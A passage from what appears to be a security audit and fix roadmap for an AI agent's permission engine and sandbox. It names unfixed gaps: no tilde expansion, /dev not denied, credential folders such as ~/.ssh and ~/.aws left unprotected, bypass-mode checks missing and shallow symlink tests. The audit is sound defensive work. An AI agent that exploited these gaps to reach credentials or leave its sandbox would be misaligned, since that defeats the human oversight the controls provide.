- §23 "Fuzz 10⁹ iterations" `[x]` — aspirational. 4 targets exist (~5200 suite iterations). NO nightly CI workflow.

**P1:**
- Dead export: `BASH_ABORT_GRACE_MS` (`src/broker/handlers/bash.ts:50`).
- Dead set: `RESERVED_SEAL_MODES` (`src/permissions/config.ts:87-88`).
- §15.4 fuzz target gaps: fs/fetch resolvers, sealing wire, broker NDJSON, classifier, state machine.
- Symlink test surface shallow (4 tests; missing chained/TOCTOU/cross-protected).
- `protected_paths` claims 5-min, ships 8 (over); spec §15.2 arithmetic sums to 132 not 136.
- State machine invalid-edge coverage implicit, not per-edge.

**P2:**
- Naming sprawl: `DegradedBannerEvent`, `SandboxDegradedActiveEvent`, `sandbox.degraded_active`, `sandbox_degraded_active` — four spellings.
- `SealMode` union vs `VALID_SEAL_MODES` runtime Set — no `satisfies` constraint.

**Coverage inventory:**
- `tests/permissions/`: 33 files, **866 tests**
- `tests/broker/`: 7 files, **122 tests**
- `tests/cli/`: 57 files, **1174 tests**
- `tests/tools/`: 23 files, **328 tests**
- `tests/fuzz/`: 5 files, **28 tests**
- `tests/conformance/`: 2 files, **6 tests** drive 160 YAML + 5 programmatic
- COMMAND_TABLE: 73 entries (spec asks ≥ 30)
- Telemetry: 7 event kinds, 7 scrub handlers, 6 with tests
- Sealing: 5/5 modes shipped

---

## Recommended Fix Roadmap

Slices in priority order. Estimated 2-4 days of focused work for P0 critical (94-98).

### Onda 1 — P0 critical blockers (5 slices)

- **Slice 94**: Subagent §10 enforcement real (R11 #1-#3). Require `capabilities` arg in `task` + `task_async`; persist `effective` + apply at child engine via `effectiveCapabilities` option on PermissionEngine.
- **Slice 95**: Replay tool real (R11 #4-#7). Child audit sink wired with `parent_approval_id`; replay reads `policy_archive`; grants snapshot persisted on audit row; replay engine includes classifier/sandbox/grants.
- **Slice 96**: Protected paths + tilde + /dev + credentials. `~` expansion in fs+bash resolvers; `/dev` to SYSTEM_DENY_ROOTS; `~/.ssh`, `~/.aws`, etc. to TILDE_ESCALATE_DIRS; both Linux + macOS sandbox runners gain hide_paths layer.
- **Slice 97**: Bootstrap + policy parsing hardening. Top-level rejectUnknownKeys; `tools.*` tool-name allowlist; `seal.locked` either errors or grows real lock semantics in hierarchy.
- **Slice 98**: Sandbox wire validation + bypass mode + grant compound guard. `sandboxProfile` validated against enum at worker-runtime + spawn broker boundaries; bypass mode runs §11 checks; grants distinguished from session-allow in upgrade gate.

### Onda 2 — robustness P0 (3 slices)

- **Slice 99**: Broker hardening. Cap stdout/stderr drain in spawn broker; cap readStdin in worker; track SIGKILL escalation timers as array (fix R7 #1); proc.exited.catch (fix R7 #3); JSON proto-pollution reviver.
- **Slice 100**: Audit chain atomicity. `BEGIN IMMEDIATE` on rotation; verifyChain re-derives genesis from latest tipMeta; atomic create+chattr before first write; archive lookup in verifySealAgainstChain; RFC 3161 TSR minimum-length + content-type validate.
- **Slice 101**: Spec §13.4/§13.5 decision — either implement interactive menu (multiple sub-slices) OR spec PR reformulating as info-only. Cannot stay drift indefinitely.

### Onda 3 — coverage + cleanup (3 slices)

- **Slice 102**: Telemetry hardening. Emit `sandbox.degraded_active` from harness; scrub Windows/URLs/hosts in PATH_REGEX; scrub `secret-access` + `net-ingress` kinds; add tests for slice 84/92 scrub branches.
- **Slice 103**: Test fixtures + dead code. Replay fixtures for deny/confirm; bypass+§11 conformance cases; grant+compound cases; remove BASH_ABORT_GRACE_MS + RESERVED_SEAL_MODES dead code.
- **Slice 104**: BACKLOG honesty update. `[x]` → `[partial]` for fuzz/replay/scrubbing/symlink/hash-chain items; document harness-delegated for §13.6 banner periodicity and §13.8 health re-check.

After slice 104, the §23 checklist can be honestly claimed `[x]` only on items that survive the review pass.
